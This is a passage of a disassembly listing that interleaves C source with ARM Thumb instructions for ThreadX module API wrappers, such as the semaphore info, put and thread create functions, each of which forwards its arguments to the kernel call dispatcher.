 8021144:	f859 3003 	ldr.w	r3, [r9, r3]
 8021148:	681c      	ldr	r4, [r3, #0]
 802114a:	6879      	ldr	r1, [r7, #4]
 802114c:	2300      	movs	r3, #0
 802114e:	683a      	ldr	r2, [r7, #0]
 8021150:	2030      	movs	r0, #48	; 0x30
 8021152:	47a0      	blx	r4
 8021154:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021156:	68fb      	ldr	r3, [r7, #12]
}
 8021158:	4618      	mov	r0, r3
 802115a:	3714      	adds	r7, #20
 802115c:	46bd      	mov	sp, r7
 802115e:	bd90      	pop	{r4, r7, pc}
 8021160:	00000004 	.word	0x00000004

08021164 <_txe_semaphore_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_semaphore_info_get(TX_SEMAPHORE *semaphore_ptr, CHAR **name, ULONG *current_value, TX_THREAD **first_suspended, ULONG *suspended_count, TX_SEMAPHORE **next_semaphore)
{
 8021164:	b590      	push	{r4, r7, lr}
 8021166:	b08b      	sub	sp, #44	; 0x2c
 8021168:	af00      	add	r7, sp, #0
 802116a:	60f8      	str	r0, [r7, #12]
 802116c:	60b9      	str	r1, [r7, #8]
 802116e:	607a      	str	r2, [r7, #4]
 8021170:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[4];

    extra_parameters[0] = (ALIGN_TYPE) current_value;
 8021172:	687b      	ldr	r3, [r7, #4]
 8021174:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) first_suspended;
 8021176:	683b      	ldr	r3, [r7, #0]
 8021178:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) suspended_count;
 802117a:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 802117c:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) next_semaphore;
 802117e:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8021180:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_INFO_GET_CALL, (ALIGN_TYPE) semaphore_ptr, (ALIGN_TYPE) name, (ALIGN_TYPE) extra_parameters);
 8021182:	4b08      	ldr	r3, [pc, #32]	; (80211a4 <_txe_semaphore_info_get+0x40>)
 8021184:	f859 3003 	ldr.w	r3, [r9, r3]
 8021188:	681c      	ldr	r4, [r3, #0]
 802118a:	68f9      	ldr	r1, [r7, #12]
 802118c:	68ba      	ldr	r2, [r7, #8]
 802118e:	f107 0314 	add.w	r3, r7, #20
 8021192:	2031      	movs	r0, #49	; 0x31
 8021194:	47a0      	blx	r4
 8021196:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8021198:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 802119a:	4618      	mov	r0, r3
 802119c:	372c      	adds	r7, #44	; 0x2c
 802119e:	46bd      	mov	sp, r7
 80211a0:	bd90      	pop	{r4, r7, pc}
 80211a2:	bf00      	nop
 80211a4:	00000004 	.word	0x00000004

080211a8 <_tx_semaphore_performance_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_semaphore_performance_info_get(TX_SEMAPHORE *semaphore_ptr, ULONG *puts, ULONG *gets, ULONG *suspensions, ULONG *timeouts)
{
 80211a8:	b590      	push	{r4, r7, lr}
 80211aa:	b089      	sub	sp, #36	; 0x24
 80211ac:	af00      	add	r7, sp, #0
 80211ae:	60f8      	str	r0, [r7, #12]
 80211b0:	60b9      	str	r1, [r7, #8]
 80211b2:	607a      	str	r2, [r7, #4]
 80211b4:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[3];

    extra_parameters[0] = (ALIGN_TYPE) gets;
 80211b6:	687b      	ldr	r3, [r7, #4]
 80211b8:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) suspensions;
 80211ba:	683b      	ldr	r3, [r7, #0]
 80211bc:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) timeouts;
 80211be:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 80211c0:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_PERFORMANCE_INFO_GET_CALL, (ALIGN_TYPE) semaphore_ptr, (ALIGN_TYPE) puts, (ALIGN_TYPE) extra_parameters);
 80211c2:	4b08      	ldr	r3, [pc, #32]	; (80211e4 <_tx_semaphore_performance_info_get+0x3c>)
 80211c4:	f859 3003 	ldr.w	r3, [r9, r3]
 80211c8:	681c      	ldr	r4, [r3, #0]
 80211ca:	68f9      	ldr	r1, [r7, #12]
 80211cc:	68ba      	ldr	r2, [r7, #8]
 80211ce:	f107 0310 	add.w	r3, r7, #16
 80211d2:	2032      	movs	r0, #50	; 0x32
 80211d4:	47a0      	blx	r4
 80211d6:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 80211d8:	69fb      	ldr	r3, [r7, #28]
}
 80211da:	4618      	mov	r0, r3
 80211dc:	3724      	adds	r7, #36	; 0x24
 80211de:	46bd      	mov	sp, r7
 80211e0:	bd90      	pop	{r4, r7, pc}
 80211e2:	bf00      	nop
 80211e4:	00000004 	.word	0x00000004

080211e8 <_tx_semaphore_performance_system_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_semaphore_performance_system_info_get(ULONG *puts, ULONG *gets, ULONG *suspensions, ULONG *timeouts)
{
 80211e8:	b590      	push	{r4, r7, lr}
 80211ea:	b089      	sub	sp, #36	; 0x24
 80211ec:	af00      	add	r7, sp, #0
 80211ee:	60f8      	str	r0, [r7, #12]
 80211f0:	60b9      	str	r1, [r7, #8]
 80211f2:	607a      	str	r2, [r7, #4]
 80211f4:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[2];

    extra_parameters[0] = (ALIGN_TYPE) suspensions;
 80211f6:	687b      	ldr	r3, [r7, #4]
 80211f8:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) timeouts;
 80211fa:	683b      	ldr	r3, [r7, #0]
 80211fc:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_PERFORMANCE_SYSTEM_INFO_GET_CALL, (ALIGN_TYPE) puts, (ALIGN_TYPE) gets, (ALIGN_TYPE) extra_parameters);
 80211fe:	4b08      	ldr	r3, [pc, #32]	; (8021220 <_tx_semaphore_performance_system_info_get+0x38>)
 8021200:	f859 3003 	ldr.w	r3, [r9, r3]
 8021204:	681c      	ldr	r4, [r3, #0]
 8021206:	68f9      	ldr	r1, [r7, #12]
 8021208:	68ba      	ldr	r2, [r7, #8]
 802120a:	f107 0314 	add.w	r3, r7, #20
 802120e:	2033      	movs	r0, #51	; 0x33
 8021210:	47a0      	blx	r4
 8021212:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 8021214:	69fb      	ldr	r3, [r7, #28]
}
 8021216:	4618      	mov	r0, r3
 8021218:	3724      	adds	r7, #36	; 0x24
 802121a:	46bd      	mov	sp, r7
 802121c:	bd90      	pop	{r4, r7, pc}
 802121e:	bf00      	nop
 8021220:	00000004 	.word	0x00000004

08021224 <_txe_semaphore_prioritize>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_semaphore_prioritize(TX_SEMAPHORE *semaphore_ptr)
{
 8021224:	b590      	push	{r4, r7, lr}
 8021226:	b085      	sub	sp, #20
 8021228:	af00      	add	r7, sp, #0
 802122a:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_PRIORITIZE_CALL, (ALIGN_TYPE) semaphore_ptr, 0, 0);
 802122c:	4b07      	ldr	r3, [pc, #28]	; (802124c <_txe_semaphore_prioritize+0x28>)
 802122e:	f859 3003 	ldr.w	r3, [r9, r3]
 8021232:	681c      	ldr	r4, [r3, #0]
 8021234:	6879      	ldr	r1, [r7, #4]
 8021236:	2300      	movs	r3, #0
 8021238:	2200      	movs	r2, #0
 802123a:	2034      	movs	r0, #52	; 0x34
 802123c:	47a0      	blx	r4
 802123e:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021240:	68fb      	ldr	r3, [r7, #12]
}
 8021242:	4618      	mov	r0, r3
 8021244:	3714      	adds	r7, #20
 8021246:	46bd      	mov	sp, r7
 8021248:	bd90      	pop	{r4, r7, pc}
 802124a:	bf00      	nop
 802124c:	00000004 	.word	0x00000004

08021250 <_txe_semaphore_put>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_semaphore_put(TX_SEMAPHORE *semaphore_ptr)
{
 8021250:	b590      	push	{r4, r7, lr}
 8021252:	b085      	sub	sp, #20
 8021254:	af00      	add	r7, sp, #0
 8021256:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_PUT_CALL, (ALIGN_TYPE) semaphore_ptr, 0, 0);
 8021258:	4b07      	ldr	r3, [pc, #28]	; (8021278 <_txe_semaphore_put+0x28>)
 802125a:	f859 3003 	ldr.w	r3, [r9, r3]
 802125e:	681c      	ldr	r4, [r3, #0]
 8021260:	6879      	ldr	r1, [r7, #4]
 8021262:	2300      	movs	r3, #0
 8021264:	2200      	movs	r2, #0
 8021266:	2035      	movs	r0, #53	; 0x35
 8021268:	47a0      	blx	r4
 802126a:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 802126c:	68fb      	ldr	r3, [r7, #12]
}
 802126e:	4618      	mov	r0, r3
 8021270:	3714      	adds	r7, #20
 8021272:	46bd      	mov	sp, r7
 8021274:	bd90      	pop	{r4, r7, pc}
 8021276:	bf00      	nop
 8021278:	00000004 	.word	0x00000004

0802127c <_txe_semaphore_put_notify>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_semaphore_put_notify(TX_SEMAPHORE *semaphore_ptr, VOID (*semaphore_put_notify)(TX_SEMAPHORE *notify_semaphore_ptr))
{
 802127c:	b590      	push	{r4, r7, lr}
 802127e:	b085      	sub	sp, #20
 8021280:	af00      	add	r7, sp, #0
 8021282:	6078      	str	r0, [r7, #4]
 8021284:	6039      	str	r1, [r7, #0]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_PUT_NOTIFY_CALL, (ALIGN_TYPE) semaphore_ptr, (ALIGN_TYPE) semaphore_put_notify, 0);
 8021286:	4b07      	ldr	r3, [pc, #28]	; (80212a4 <_txe_semaphore_put_notify+0x28>)
 8021288:	f859 3003 	ldr.w	r3, [r9, r3]
 802128c:	681c      	ldr	r4, [r3, #0]
 802128e:	6879      	ldr	r1, [r7, #4]
 8021290:	683a      	ldr	r2, [r7, #0]
 8021292:	2300      	movs	r3, #0
 8021294:	2036      	movs	r0, #54	; 0x36
 8021296:	47a0      	blx	r4
 8021298:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 802129a:	68fb      	ldr	r3, [r7, #12]
}
 802129c:	4618      	mov	r0, r3
 802129e:	3714      	adds	r7, #20
 80212a0:	46bd      	mov	sp, r7
 80212a2:	bd90      	pop	{r4, r7, pc}
 80212a4:	00000004 	.word	0x00000004

080212a8 <_txe_thread_create>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_create(TX_THREAD *thread_ptr, CHAR *name_ptr, VOID (*entry_function)(ULONG entry_input), ULONG entry_input, VOID *stack_start, ULONG stack_size, UINT priority, UINT preempt_threshold, ULONG time_slice, UINT auto_start, UINT thread_control_block_size)
{
 80212a8:	b590      	push	{r4, r7, lr}
 80212aa:	b08f      	sub	sp, #60	; 0x3c
 80212ac:	af00      	add	r7, sp, #0
 80212ae:	60f8      	str	r0, [r7, #12]
 80212b0:	60b9      	str	r1, [r7, #8]
 80212b2:	607a      	str	r2, [r7, #4]
 80212b4:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[9];

    extra_parameters[0] = (ALIGN_TYPE) entry_function;
 80212b6:	687b      	ldr	r3, [r7, #4]
 80212b8:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) entry_input;
 80212ba:	683b      	ldr	r3, [r7, #0]
 80212bc:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) stack_start;
 80212be:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 80212c0:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) stack_size;
 80212c2:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 80212c4:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) priority;
 80212c6:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 80212c8:	623b      	str	r3, [r7, #32]
    extra_parameters[5] = (ALIGN_TYPE) preempt_threshold;
 80212ca:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80212cc:	627b      	str	r3, [r7, #36]	; 0x24
    extra_parameters[6] = (ALIGN_TYPE) time_slice;
 80212ce:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80212d0:	62bb      	str	r3, [r7, #40]	; 0x28
    extra_parameters[7] = (ALIGN_TYPE) auto_start;
 80212d2:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 80212d4:	62fb      	str	r3, [r7, #44]	; 0x2c
    extra_parameters[8] = (ALIGN_TYPE) thread_control_block_size;
 80212d6:	6e3b      	ldr	r3, [r7, #96]	; 0x60
 80212d8:	633b      	str	r3, [r7, #48]	; 0x30

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_CREATE_CALL, (ALIGN_TYPE) thread_ptr, (ALIGN_TYPE) name_ptr, (ALIGN_TYPE) extra_parameters);
 80212da:	4b08      	ldr	r3, [pc, #32]	; (80212fc <_txe_thread_create+0x54>)
 80212dc:	f859 3003 	ldr.w	r3, [r9, r3]
 80212e0:	681c      	ldr	r4, [r3, #0]
 80212e2:	68f9      	ldr	r1, [r7, #12]
 80212e4:	68ba      	ldr	r2, [r7, #8]
 80212e6:	f107 0310 	add.w	r3, r7, #16
 80212ea:	2037      	movs	r0, #55	; 0x37
 80212ec:	47a0      	blx	r4
 80212ee:	6378      	str	r0, [r7, #52]	; 0x34

    /* Return value to the caller.  */
    return(return_value);
 80212f0:	6b7b      	ldr	r3, [r7, #52]	; 0x34
}
 80212f2:	4618      	mov	r0, r3
 80212f4:	373c      	adds	r7, #60	; 0x3c
 80212f6:	46bd      	mov	sp, r7
 80212f8:	bd90      	pop	{r4, r7, pc}
 80212fa:	bf00      	nop
 80212fc:	00000004 	.word	0x00000004

08021300 <_txe_thread_delete>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_delete(TX_THREAD *thread_ptr)
{
 8021300:	b590      	push	{r4, r7, lr}
 8021302:	b085      	sub	sp, #20
 8021304:	af00      	add	r7, sp, #0
 8021306:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_DELETE_CALL, (ALIGN_TYPE) thread_ptr, 0, 0);
 8021308:	4b07      	ldr	r3, [pc, #28]	; (8021328 <_txe_thread_delete+0x28>)
 802130a:	f859 3003 	ldr.w	r3, [r9, r3]
 802130e:	681c      	ldr	r4, [r3, #0]
 8021310:	6879      	ldr	r1, [r7, #4]
 8021312:	2300      	movs	r3, #0
 8021314:	2200      	movs	r2, #0
 8021316:	2038      	movs	r0, #56	; 0x38
 8021318:	47a0      	blx	r4
 802131a:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 802131c:	68fb      	ldr	r3, [r7, #12]
}
 802131e:	4618      	mov	r0, r3
 8021320:	3714      	adds	r7, #20
 8021322:	46bd      	mov	sp, r7
 8021324:	bd90      	pop	{r4, r7, pc}
 8021326:	bf00      	nop
 8021328:	00000004 	.word	0x00000004

0802132c <_txe_thread_entry_exit_notify>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_entry_exit_notify(TX_THREAD *thread_ptr, VOID (*thread_entry_exit_notify)(TX_THREAD *notify_thread_ptr, UINT type))
{
 802132c:	b590      	push	{r4, r7, lr}
 802132e:	b085      	sub	sp, #20
 8021330:	af00      	add	r7, sp, #0
 8021332:	6078      	str	r0, [r7, #4]
 8021334:	6039      	str	r1, [r7, #0]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_ENTRY_EXIT_NOTIFY_CALL, (ALIGN_TYPE) thread_ptr, (ALIGN_TYPE) thread_entry_exit_notify, 0);
 8021336:	4b07      	ldr	r3, [pc, #28]	; (8021354 <_txe_thread_entry_exit_notify+0x28>)
 8021338:	f859 3003 	ldr.w	r3, [r9, r3]
 802133c:	681c      	ldr	r4, [r3, #0]
 802133e:	6879      	ldr	r1, [r7, #4]
 8021340:	683a      	ldr	r2, [r7, #0]
 8021342:	2300      	movs	r3, #0
 8021344:	2039      	movs	r0, #57	; 0x39
 8021346:	47a0      	blx	r4
 8021348:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 802134a:	68fb      	ldr	r3, [r7, #12]
}
 802134c:	4618      	mov	r0, r3
 802134e:	3714      	adds	r7, #20
 8021350:	46bd      	mov	sp, r7
 8021352:	bd90      	pop	{r4, r7, pc}
 8021354:	00000004 	.word	0x00000004

08021358 <_tx_thread_identify>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
TX_THREAD *_tx_thread_identify(VOID)
{
 8021358:	b590      	push	{r4, r7, lr}
 802135a:	b083      	sub	sp, #12
 802135c:	af00      	add	r7, sp, #0

TX_THREAD *return_value;

    /* Call module manager dispatcher.  */
    return_value = (TX_THREAD *) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_IDENTIFY_CALL, 0, 0, 0);
 802135e:	4b08      	ldr	r3, [pc, #32]	; (8021380 <_tx_thread_identify+0x28>)
 8021360:	f859 3003 	ldr.w	r3, [r9, r3]
 8021364:	681c      	ldr	r4, [r3, #0]
 8021366:	2300      	movs	r3, #0
 8021368:	2200      	movs	r2, #0
 802136a:	2100      	movs	r1, #0
 802136c:	203a      	movs	r0, #58	; 0x3a
 802136e:	47a0      	blx	r4
 8021370:	4603      	mov	r3, r0
 8021372:	607b      	str	r3, [r7, #4]

    /* Return value to the caller.  */
    return(return_value);
 8021374:	687b      	ldr	r3, [r7, #4]
}
 8021376:	4618      	mov	r0, r3
 8021378:	370c      	adds	r7, #12
 802137a:	46bd      	mov	sp, r7
 802137c:	bd90      	pop	{r4, r7, pc}
 802137e:	bf00      	nop
 8021380:	00000004 	.word	0x00000004

08021384 <_txe_thread_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_info_get(TX_THREAD *thread_ptr, CHAR **name, UINT *state, ULONG *run_count, UINT *priority, UINT *preemption_threshold, ULONG *time_slice, TX_THREAD **next_thread, TX_THREAD **next_suspended_thread)
{
 8021384:	b590      	push	{r4, r7, lr}
 8021386:	b08d      	sub	sp, #52	; 0x34
 8021388:	af00      	add	r7, sp, #0
 802138a:	60f8      	str	r0, [r7, #12]
 802138c:	60b9      	str	r1, [r7, #8]
 802138e:	607a      	str	r2, [r7, #4]
 8021390:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[7];

    extra_parameters[0] = (ALIGN_TYPE) state;
 8021392:	687b      	ldr	r3, [r7, #4]
 8021394:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) run_count;
 8021396:	683b      	ldr	r3, [r7, #0]
 8021398:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) priority;
 802139a:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 802139c:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) preemption_threshold;
 802139e:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80213a0:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) time_slice;
 80213a2:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 80213a4:	623b      	str	r3, [r7, #32]
    extra_parameters[5] = (ALIGN_TYPE) next_thread;
 80213a6:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 80213a8:	627b      	str	r3, [r7, #36]	; 0x24
    extra_parameters[6] = (ALIGN_TYPE) next_suspended_thread;
 80213aa:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 80213ac:	62bb      	str	r3, [r7, #40]	; 0x28

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_INFO_GET_CALL, (ALIGN_TYPE) thread_ptr, (ALIGN_TYPE) name, (ALIGN_TYPE) extra_parameters);
 80213ae:	4b08      	ldr	r3, [pc, #32]	; (80213d0 <_txe_thread_info_get+0x4c>)
 80213b0:	f859 3003 	ldr.w	r3, [r9, r3]
 80213b4:	681c      	ldr	r4, [r3, #0]
 80213b6:	68f9      	ldr	r1, [r7, #12]
 80213b8:	68ba      	ldr	r2, [r7, #8]
 80213ba:	f107 0310 	add.w	r3, r7, #16
 80213be:	203b      	movs	r0, #59	; 0x3b
 80213c0:	47a0      	blx	r4
 80213c2:	62f8      	str	r0, [r7, #44]	; 0x2c

    /* Return value to the caller.  */
    return(return_value);
 80213c4:	6afb      	ldr	r3, [r7, #44]	; 0x2c
}
 80213c6:	4618      	mov	r0, r3
 80213c8:	3734      	adds	r7, #52	; 0x34
 80213ca:	46bd      	mov	sp, r7
 80213cc:	bd90      	pop	{r4, r7, pc}
 80213ce:	bf00      	nop
 80213d0:	00000004 	.word	0x00000004

080213d4 <_tx_thread_interrupt_control>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_thread_interrupt_control(UINT new_posture)
{
 80213d4:	b590      	push	{r4, r7, lr}
 80213d6:	b085      	sub	sp, #20
 80213d8:	af00      	add	r7, sp, #0
 80213da:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_INTERRUPT_CONTROL_CALL, (ALIGN_TYPE) new_posture, 0, 0);
 80213dc:	4b07      	ldr	r3, [pc, #28]	; (80213fc <_tx_thread_interrupt_control+0x28>)
 80213de:	f859 3003 	ldr.w	r3, [r9, r3]
 80213e2:	681c      	ldr	r4, [r3, #0]
 80213e4:	2300      	movs	r3, #0
 80213e6:	2200      	movs	r2, #0
 80213e8:	6879      	ldr	r1, [r7, #4]
 80213ea:	2019      	movs	r0, #25
 80213ec:	47a0      	blx	r4
 80213ee:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80213f0:	68fb      	ldr	r3, [r7, #12]
}
 80213f2:	4618      	mov	r0, r3
 80213f4:	3714      	adds	r7, #20
 80213f6:	46bd      	mov	sp, r7
 80213f8:	bd90      	pop	{r4, r7, pc}
 80213fa:	bf00      	nop
 80213fc:	00000004 	.word	0x00000004

08021400 <_tx_thread_performance_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_thread_performance_info_get(TX_THREAD *thread_ptr, ULONG *resumptions, ULONG *suspensions, ULONG *solicited_preemptions, ULONG *interrupt_preemptions, ULONG *priority_inversions, ULONG *time_slices, ULONG *relinquishes, ULONG *timeouts, ULONG *wait_aborts, TX_THREAD **last_preempted_by)
{
 8021400:	b590      	push	{r4, r7, lr}
 8021402:	b08f      	sub	sp, #60	; 0x3c
 8021404:	af00      	add	r7, sp, #0
 8021406:	60f8      	str	r0, [r7, #12]
 8021408:	60b9      	str	r1, [r7, #8]
 802140a:	607a      	str	r2, [r7, #4]
 802140c:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[9];

    extra_parameters[0] = (ALIGN_TYPE) suspensions;
 802140e:	687b      	ldr	r3, [r7, #4]
 8021410:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) solicited_preemptions;
 8021412:	683b      	ldr	r3, [r7, #0]
 8021414:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) interrupt_preemptions;
 8021416:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8021418:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) priority_inversions;
 802141a:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 802141c:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) time_slices;
 802141e:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8021420:	623b      	str	r3, [r7, #32]
    extra_parameters[5] = (ALIGN_TYPE) relinquishes;
 8021422:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8021424:	627b      	str	r3, [r7, #36]	; 0x24
    extra_parameters[6] = (ALIGN_TYPE) timeouts;
 8021426:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8021428:	62bb      	str	r3, [r7, #40]	; 0x28
    extra_parameters[7] = (ALIGN_TYPE) wait_aborts;
 802142a:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 802142c:	62fb      	str	r3, [r7, #44]	; 0x2c
    extra_parameters[8] = (ALIGN_TYPE) last_preempted_by;
 802142e:	6e3b      	ldr	r3, [r7, #96]	; 0x60
 8021430:	633b      	str	r3, [r7, #48]	; 0x30

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_PERFORMANCE_INFO_GET_CALL, (ALIGN_TYPE) thread_ptr, (ALIGN_TYPE) resumptions, (ALIGN_TYPE) extra_parameters);
 8021432:	4b08      	ldr	r3, [pc, #32]	; (8021454 <_tx_thread_performance_info_get+0x54>)
 8021434:	f859 3003 	ldr.w	r3, [r9, r3]
 8021438:	681c      	ldr	r4, [r3, #0]
 802143a:	68f9      	ldr	r1, [r7, #12]
 802143c:	68ba      	ldr	r2, [r7, #8]
 802143e:	f107 0310 	add.w	r3, r7, #16
 8021442:	203c      	movs	r0, #60	; 0x3c
 8021444:	47a0      	blx	r4
 8021446:	6378      	str	r0, [r7, #52]	; 0x34

    /* Return value to the caller.  */
    return(return_value);
 8021448:	6b7b      	ldr	r3, [r7, #52]	; 0x34
}
 802144a:	4618      	mov	r0, r3
 802144c:	373c      	adds	r7, #60	; 0x3c
 802144e:	46bd      	mov	sp, r7
 8021450:	bd90      	pop	{r4, r7, pc}
 8021452:	bf00      	nop
 8021454:	00000004 	.word	0x00000004

08021458 <_tx_thread_performance_system_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_thread_performance_system_info_get(ULONG *resumptions, ULONG *suspensions, ULONG *solicited_preemptions, ULONG *interrupt_preemptions, ULONG *priority_inversions, ULONG *time_slices, ULONG *relinquishes, ULONG *timeouts, ULONG *wait_aborts, ULONG *non_idle_returns, ULONG *idle_returns)
{
 8021458:	b590      	push	{r4, r7, lr}
 802145a:	b08f      	sub	sp, #60	; 0x3c
 802145c:	af00      	add	r7, sp, #0
 802145e:	60f8      	str	r0, [r7, #12]
 8021460:	60b9      	str	r1, [r7, #8]
 8021462:	607a      	str	r2, [r7, #4]
 8021464:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[9];

    extra_parameters[0] = (ALIGN_TYPE) solicited_preemptions;
 8021466:	687b      	ldr	r3, [r7, #4]
 8021468:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) interrupt_preemptions;
 802146a:	683b      	ldr	r3, [r7, #0]
 802146c:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) priority_inversions;
 802146e:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8021470:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) time_slices;
 8021472:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8021474:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) relinquishes;
 8021476:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8021478:	623b      	str	r3, [r7, #32]
    extra_parameters[5] = (ALIGN_TYPE) timeouts;
